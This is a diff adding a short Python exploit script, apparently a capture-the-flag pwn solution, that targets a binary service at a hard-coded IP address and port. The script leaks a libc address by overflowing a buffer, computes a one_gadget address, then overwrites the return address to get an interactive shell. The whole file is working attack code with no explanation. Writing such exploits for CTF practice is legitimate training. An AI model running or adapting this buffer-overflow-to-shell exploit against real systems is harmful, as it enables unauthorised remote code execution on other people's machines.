@@ -1,0 +1,19 @@
+from PwnContext import *
+ctx.binary='./pwn'
+ctx.remote=('172.29.14.115',9999)
+ctx.start('remote')
+#ctx.start()
+
+m=0x1b23dc
+
+ctx.recv()
+ctx.send('a'*0x20)
+ctx.recvuntil('a'*0x20)
+ctx.recv(16)
+libc_base=u32(ctx.recv(4))-m
+one_gadget=libc_base+0x3ac5c
+print "libc_base -> " + hex(libc_base)
+print "one_gadget -> " + hex(one_gadget)
+ctx.send((0x30-4)*'a'+p32(one_gadget))
+ctx.interactive()
+ctx.close()
